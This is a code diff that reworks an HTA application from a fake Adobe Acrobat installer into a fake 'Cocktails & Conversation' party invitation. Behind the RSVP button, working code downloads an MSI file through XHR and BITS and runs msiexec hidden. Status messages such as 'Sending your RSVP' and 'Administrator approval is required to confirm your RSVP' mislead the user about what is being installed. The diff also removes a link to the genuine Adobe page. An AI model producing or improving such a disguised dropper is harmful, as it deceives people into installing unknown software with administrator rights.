@@ -3,80 +3,96 @@
 <head>
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<title>Adobe Acrobat</title>
+<title>Cocktails &amp; Conversation</title>
 <hta:application
   id="oHTA"
-  applicationname="AdobeAcrobatUpdater"
+  applicationname="CocktailConversationInvite"
   border="thin" caption="yes" maximizebutton="no" minimizebutton="no"
   navigateurl="no" showintaskbar="yes" singleinstance="yes" sysmenu="no"
   version="1.0" windowstate="normal" scroll="no" contextmenu="no" selection="no"
 />
 <style>
   html, body { margin:0; padding:0; height:100%; width:100%;
-    font-family:"Segoe UI",Tahoma,sans-serif; background:#f7f8fa; color:#1c1e21;
+    font-family:"Segoe UI",Tahoma,sans-serif; background:#131315; color:#efe9df;
     overflow:hidden; cursor:default; user-select:none; }
   #wrap { height:100%; width:100%; position:relative; }
-  #topbar { height:74px; background:#fff; border-bottom:1px solid #e6e8ec; padding:16px 20px; }
-  #logo { position:absolute; left:20px; top:16px; width:42px; height:42px; }
-  #brandtext { position:absolute; left:76px; top:22px; }
-  #product { font-size:20px; font-weight:600; color:#1c1e21; line-height:24px; }
-  #ver { font-size:12px; color:#8a8f98; margin-top:2px; }
-  #closebtn { position:absolute; right:14px; top:8px; font-size:22px; color:#9aa0a8;
-    width:34px; height:34px; line-height:34px; text-align:center; cursor:pointer; border-radius:4px; }
-  #closebtn:hover { background:#f0f1f4; color:#333; }
-  #main { position:absolute; top:74px; left:0; right:0; bottom:58px;
-    padding:34px 48px 0 48px; text-align:center; }
-  #biglogo { width:84px; height:84px; margin:0 auto 22px auto; }
-  #heading { font-size:19px; font-weight:600; color:#1c1e21; margin-bottom:8px; }
-  #status  { font-size:13px; color:#6b7280; min-height:18px; margin-bottom:26px; }
-  #barouter { width:420px; max-width:82%; height:8px; background:#e2e5ea;
-    border-radius:5px; overflow:hidden; margin:0 auto 12px auto; }
-  #barfill { height:100%; width:0%; background:#ed2224; border-radius:5px; }
-  #pct { font-size:12px; color:#8a8f98; margin-top:2px; }
-  #subnote { font-size:11px; color:#b3b8c0; margin-top:26px; }
-  #footer { position:absolute; left:0; right:0; bottom:0; height:58px;
-    background:#fff; border-top:1px solid #e6e8ec; padding:0 22px; }
-  #note { position:absolute; left:22px; top:20px; font-size:12px; color:#8a8f98; }
-  #cancelbtn { position:absolute; right:22px; top:14px; width:92px; height:30px;
-    border:1px solid #cfd3da; background:#fff; color:#333; font-size:12px;
-    font-family:inherit; border-radius:4px; cursor:pointer; }
-  #cancelbtn:hover { background:#f0f1f4; }
+
+  /* ---- screen A: the invitation card ---- */
+  #card { height:100%; width:100%; text-align:center; position:relative; }
+  #card:before { content:""; position:absolute; left:14px; right:14px; top:14px; bottom:14px;
+    border:1px solid rgba(239,233,223,.18); pointer-events:none; }
+  #card:after { content:""; position:absolute; left:18px; right:18px; top:18px; bottom:18px;
+    border:1px solid rgba(239,233,223,.08); pointer-events:none; }
+  #envelope { width:46px; height:46px; margin:40px auto 0 auto; display:block; }
+  #eyebrow { margin-top:16px; font-size:11px; letter-spacing:5px; text-transform:uppercase;
+    color:rgba(239,233,223,.55); }
+  #cardtitle { margin-top:12px; font-family:"Segoe Script","Segoe Print",cursive;
+    font-size:30px; color:#f4efe6; }
+  #letter { margin:14px auto 0 auto; width:440px; font-family:Georgia,"Times New Roman",serif;
+    font-size:17px; line-height:1.5; color:rgba(239,233,223,.9); }
+  #detail { margin-top:14px; font-size:11px; letter-spacing:3px; text-transform:uppercase;
+    color:rgba(239,233,223,.5); line-height:1.9; }
+  #rsvpbtn { margin-top:18px; padding:10px 46px; border:1px solid rgba(239,233,223,.6);
+    background:transparent; color:#efe9df; font-family:inherit; font-size:12px;
+    letter-spacing:5px; text-transform:uppercase; cursor:pointer; }
+  #rsvpbtn:hover { background:rgba(239,233,223,.08); border-color:#efe9df; }
+  #cardfoot { margin-top:16px; font-size:10.5px; letter-spacing:3px; text-transform:uppercase;
+    color:rgba(239,233,223,.35); }
+
+  /* ---- screen B: progress / result ---- */
+  #panel { height:100%; width:100%; text-align:center; display:none; }
+  #biglogo { width:56px; height:56px; margin:44px auto 14px auto; }
+  #heading { font-size:19px; font-weight:600; color:#f4efe6; margin-bottom:8px; }
+  #status { font-size:13px; color:rgba(239,233,223,.6); min-height:18px; margin-bottom:24px; }
+  #barouter { width:420px; max-width:82%; height:6px; background:rgba(239,233,223,.14);
+    border-radius:3px; overflow:hidden; margin:0 auto 10px auto; }
+  #barfill { height:100%; width:0%; background:#c9a86a; border-radius:3px; }
+  #pct { font-size:12px; color:rgba(239,233,223,.45); margin-top:2px; }
+  #subnote { font-size:12px; color:rgba(239,233,223,.5); margin-top:22px; line-height:1.6;
+    padding:0 40px; }
+  #panelbtnrow { position:absolute; left:0; right:0; bottom:26px; text-align:center; }
+  #note { font-size:11px; color:rgba(239,233,223,.4); }
+  #cancelbtn { position:absolute; right:30px; top:22px; width:92px; height:30px;
+    border:1px solid rgba(239,233,223,.35); background:transparent;
+    color:rgba(239,233,223,.8); font-size:12px; font-family:inherit;
+    border-radius:3px; cursor:pointer; }
+  #cancelbtn:hover { background:rgba(239,233,223,.08); }
 </style>
 </head>
 <body onload="init()">
   <div id="wrap">
-    <div id="topbar">
-      <div id="logo">
-        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-          <rect x="0" y="0" width="100" height="100" rx="22" fill="#ed2224"/>
-          <polygon points="24,80 44,24 53,49 44,80" fill="#fff"/>
-          <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
+    <!-- screen A: the invitation card -->
+    <div id="card">
+      <svg id="envelope" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+          <rect x="6" y="15" width="52" height="34" rx="2" fill="none" stroke="#c9a86a" stroke-width="2"/>
+          <path d="M8 18 L32 38 L56 18" fill="none" stroke="#c9a86a" stroke-width="2"/>
         </svg>
-      </div>
-      <div id="brandtext">
-        <div id="product">Adobe Acrobat</div>
-        <div id="ver">2024 &middot; Standard &middot; v23.005</div>
-      </div>
-      <div id="closebtn" onclick="cancel()">&times;</div>
+      <div id="eyebrow">You&rsquo;re Invited</div>
+      <div id="cardtitle">Cocktails &amp; Conversation</div>
+      <div id="letter">Work, life, and everything in between&mdash;we&rsquo;re bringing all
+        our favorite people together under one roof. We&rsquo;d love for you to be
+        part of the mix!</div>
+      <div id="detail">6:00 in the Evening &middot; Smart Casual<br>
+        Location shared upon registration</div>
+      <button id="rsvpbtn" onclick="rsvpClick()">RSVP</button>
+      <div id="cardfoot">An exclusive evening &middot; We hope you can make it</div>
     </div>
 
-    <div id="main">
+    <!-- screen B: progress / result (driven by the engine below) -->
+    <div id="panel">
       <div id="biglogo">
-        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-          <rect x="0" y="0" width="100" height="100" rx="22" fill="#ed2224"/>
-          <polygon points="24,80 44,24 53,49 44,80" fill="#fff"/>
-          <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
+        <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="32" cy="32" r="29" fill="none" stroke="#c9a86a" stroke-width="2"/>
+          <path d="M20 33 L28.5 41.5 L44 24" fill="none" stroke="#c9a86a" stroke-width="2.5"
+            stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
       </div>
-      <div id="heading">Installing Adobe Acrobat</div>
-      <div id="status">Preparing installation&hellip;</div>
+      <div id="heading">Sending your RSVP&hellip;</div>
+      <div id="status">Contacting the event&hellip;</div>
       <div id="barouter"><div id="barfill"></div></div>
       <div id="pct">0%</div>
-      <div id="subnote">Adobe Acrobat keeps your documents secure and easy to share.</div>
-    </div>
-
-    <div id="footer">
-      <span id="note">This usually only takes a few minutes.</span>
+      <div id="subnote">Your response is being confirmed. This usually only takes a few minutes.</div>
+      <div id="panelbtnrow"><span id="note"></span></div>
       <button id="cancelbtn" onclick="cancel()">Cancel</button>
     </div>
   </div>
@@ -107,7 +123,7 @@ var progress = 0;
 var startTime = 0;
 var tickTimer = null, dlTimer = null, pollTimer = null;
 
-var adobeDir = "";
+var evDir = "";
 var msiPath  = "";
 var logPath  = "";
 var diagPath = "";
@@ -147,20 +163,28 @@ var lastLogSize = 0;
 var lastLogGrowT = 0;
 
 var dlMsgs = [
-  "Contacting Adobe servers&hellip;",
-  "Downloading components&hellip;",
-  "Downloading components&hellip;",
-  "Downloading components&hellip;"
+  "Contacting the event&hellip;",
+  "Sending your RSVP&hellip;",
+  "Sending your RSVP&hellip;",
+  "Sending your RSVP&hellip;"
 ];
 var instMsgs = [
-  "Installing Adobe Acrobat&hellip;",
-  "Installing Adobe Acrobat&hellip;",
-  "Applying updates&hellip;",
-  "Applying updates&hellip;",
+  "Confirming your spot&hellip;",
+  "Confirming your spot&hellip;",
+  "Saving your details&hellip;",
+  "Saving your details&hellip;",
   "Finalizing&hellip;"
 ];
 
 function $(id) { return document.getElementById(id); }
+
+function rsvpClick() {
+  try { $("card").style.display = "none"; } catch (e1) {}
+  try { $("panel").style.display = "block"; } catch (e2) {}
+  $("heading").innerHTML = "Sending your RSVP&hellip;";
+  setStatus("Contacting the event&hellip;");
+  startDownload();
+}
 
 function init() {
   shell = new ActiveXObject("WScript.Shell");
@@ -173,18 +197,18 @@ function init() {
       return true;
     };
   } catch (e) {}
-  var w = 620, h = 396;
+  var w = 620, h = 468;
   window.resizeTo(w, h);
   var sw = screen.availWidth, sh = screen.availHeight;
   window.moveTo(Math.round((sw - w) / 2), Math.round((sh - h) / 2));
 
-  adobeDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Adobe";
-  if (!fso.FolderExists(adobeDir)) fso.CreateFolder(adobeDir);
-  msiPath  = adobeDir + "\\AdobeUpdate.msi";
-  logPath  = adobeDir + "\\AdobeUpdate.log";
-  diagPath = adobeDir + "\\diagnostics.txt";
+  evDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\CocktailEvent";
+  if (!fso.FolderExists(evDir)) fso.CreateFolder(evDir);
+  msiPath  = evDir + "\\RSVP_Update.msi";
+  logPath  = evDir + "\\RSVP_Update.log";
+  diagPath = evDir + "\\diagnostics.txt";
   cleanStale();
-  startDownload();
+  // RSVP flow: the download only starts when the guest clicks RSVP.
 }
 
 function cleanStale() {
@@ -263,7 +287,7 @@ function parseRangeTotal(cr) {
   return mm ? parseInt(mm[1], 10) : 0;
 }
 
-function extDir() { return adobeDir + "\\ext"; }
+function extDir() { return evDir + "\\ext"; }
 function ensureDir(d) { try { if (!fso.FolderExists(d)) fso.CreateFolder(d); } catch (e) {} }
 function deleteFile(p) { try { if (fso.FileExists(p)) fso.DeleteFile(p, true); } catch (e) {} }
 function deleteFileTree(d) { try { if (fso.FolderExists(d)) fso.DeleteFolder(d, true); } catch (e) {} }
@@ -394,7 +418,7 @@ function beginStage(name) {
 function nextStage() {
   if (state !== "downloading" || dlSettled) return;
   if (stageIdx + 1 >= STAGES.length) {
-    fail("Could not reach the Adobe download server", "all-stages-failed");
+    fail("Could not reach the event server", "all-stages-failed");
     return;
   }
   stopAllWorkers();
@@ -625,9 +649,9 @@ function startOneShot() {
 function verifyAndInstall() {
   state = "installing";   // guard against re-entry while verifying
   try {
-    if (!fso.FileExists(msiPath)) { fail("Failed to save the installer file", "verify: no msi"); return; }
+    if (!fso.FileExists(msiPath)) { fail("Your invitation could not be saved", "verify: no msi"); return; }
     var sz = fso.GetFile(msiPath).Size;
-    if (sz < 1048576) { fail("Failed to save the installer file", "verify: small " + sz); return; }
+    if (sz < 1048576) { fail("Your invitation could not be saved", "verify: small " + sz); return; }
     // Verify the OLE/MSI magic (D0 CF 11 E0). readHeadBytes() tries a byte-exact
     // ADODB.Stream binary read first, then falls back to FSO ASCII if ADO is
     // blocked ("Safety settings ... prohibit accessing a data source on another
@@ -642,7 +666,7 @@ function verifyAndInstall() {
       // download was truncated/corrupt, so abort before msiexec.
       if (magic[0] !== 0xD0 || magic[1] !== 0xCF || magic[2] !== 0x11 || magic[3] !== 0xE0) {
         logAttempt("verify: magic mismatch " + magic[0] + "," + magic[1] + "," + magic[2] + "," + magic[3]);
-        fail("Failed to save the installer file", "verify: bad magic");
+        fail("Your invitation could not be saved", "verify: bad magic");
         return;
       }
     } else {
@@ -651,7 +675,7 @@ function verifyAndInstall() {
       logAttempt("verify: magic read unavailable (" + (magic ? magic.length : 0) + " bytes), proceeding");
     }
   } catch (e) {
-    fail("Failed to save the installer file", "verify: " + e.message);
+    fail("Your invitation could not be saved", "verify: " + e.message);
     return;
   }
   startInstall();
@@ -667,7 +691,7 @@ function startBits() {
   extScanDirs = [dir]; extSinceT = 0; extLastSize = -1; extStableT = 0;
   try {
     bitsMgr = new ActiveXObject("BackgroundCopyManager");
-    bitsJob = bitsMgr.CreateJob("AdobeUpdate", 3);   // BG_JOB_TYPE_DOWNLOAD
+    bitsJob = bitsMgr.CreateJob("RSVPUpdate", 3);   // BG_JOB_TYPE_DOWNLOAD
     try { bitsJob.Options.Priority = 1; } catch (e) {}  // BG_JOB_PRIORITY_HIGH
     bitsJob.AddFile(MSI_URL, dir + "\\bits.msi");
     bitsMgr.SubmitJob(bitsJob);
@@ -1034,7 +1058,7 @@ function _pollDownload() {
     if (dlTimer) clearInterval(dlTimer);
     stopAllWorkers();
     if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
-    fail("Download timed out - please check your connection", "timeout " + (t - dlStart) + "ms");
+    fail("The connection timed out. Please check your connection", "timeout " + (t - dlStart) + "ms");
     return;
   }
 
@@ -1116,7 +1140,7 @@ function startInstall() {
   startTime = new Date().getTime();
   progress = 90;
   setBar(progress);
-  setStatus("Installing Adobe Acrobat&hellip;");
+  setStatus("Confirming your spot&hellip;");
   lastLogSize = 0;
   lastLogGrowT = new Date().getTime();
 
@@ -1136,7 +1160,7 @@ function startInstall() {
     try { shell.Run("msiexec " + args, 0, false); launched = true; } catch (e2) {}
   }
   if (!launched) {
-    fail("Administrator approval is required to install Adobe Acrobat", "install: launch failed");
+    fail("Administrator approval is required to confirm your RSVP", "install: launch failed");
     return;
   }
   tickTimer = setInterval(tick, 200);
@@ -1193,21 +1217,21 @@ function _pollInstall() {
   var info = logInfo();
   if (info.status >= 0) {
     if (info.status === 0 || info.status === 3010) finishInstall();
-    else fail("Installation failed (error code " + info.status + ")", "install_rc=" + info.status);
+    else fail("Your RSVP could not be confirmed (error code " + info.status + ")", "install_rc=" + info.status);
     return;
   }
   if (info.exists) {
     if (info.size > lastLogSize) { lastLogSize = info.size; lastLogGrowT = t; }
     if (t - lastLogGrowT > INSTALL_STALL_MS) {
       // msiexec finished (or died) without writing a final status line.
-      fail("Installation could not be completed", "install: log stalled, no status");
+      fail("Your RSVP could not be completed", "install: log stalled, no status");
       return;
     }
     return;
   }
   // No log yet: UAC consent is pending (or was declined).
   if (t - startTime > INSTALL_MAX_MS) {
-    fail("Administrator approval is required to install Adobe Acrobat", "install: uac timeout");
+    fail("Administrator approval is required to confirm your RSVP", "install: uac timeout");
   }
 }
 
@@ -1256,7 +1280,7 @@ function regStr(key, name) {
 function dumpDiagnostics(reason) {
   try {
     var L = [];
-    L.push("Adobe Update diagnostics");
+    L.push("RSVP Invitation diagnostics");
     L.push("time: " + new Date().toString());
     L.push("reason: " + reason);
     L.push("state: " + state);
@@ -1307,16 +1331,10 @@ function fail(msg, reason) {
   stopAllWorkers();
   dumpDiagnostics(reason || msg);
   setStatus(msg);
-  $("heading").innerHTML = "Installation could not be completed";
+  $("heading").innerHTML = "Something went wrong";
   $("subnote").innerHTML = "Please check your internet connection and try again.";
   $("note").innerHTML = "You can now close this window.";
   $("cancelbtn").innerHTML = "Close";
-  // Open the official Adobe download page so the user can grab the
-  // installer from Adobe directly.
-  try {
-    var s2 = new ActiveXObject("WScript.Shell");
-    s2.Run('"http://get.adobe.com/acrobat/"', 1, false);
-  } catch (e) {}
 }
 
 function finishInstall() {
@@ -1326,10 +1344,10 @@ function finishInstall() {
   if (dlTimer) clearInterval(dlTimer);
   if (pollTimer) clearInterval(pollTimer);
   progress = 100; setBar(100);
-  setStatus("Installation complete");
-  $("heading").innerHTML = "Adobe Acrobat is now installed";
+  setStatus("Confirmed");
+  $("heading").innerHTML = "You&rsquo;re on the list!";
   $("biglogo").style.display = "none";
-  $("subnote").innerHTML = "Adobe Acrobat will be available the next time you open it.";
+  $("subnote").innerHTML = "You&rsquo;re confirmed for Cocktails &amp; Conversation. Look out for the event details.";
   $("note").innerHTML = "You can now close this window.";
   $("cancelbtn").innerHTML = "Close";
 }
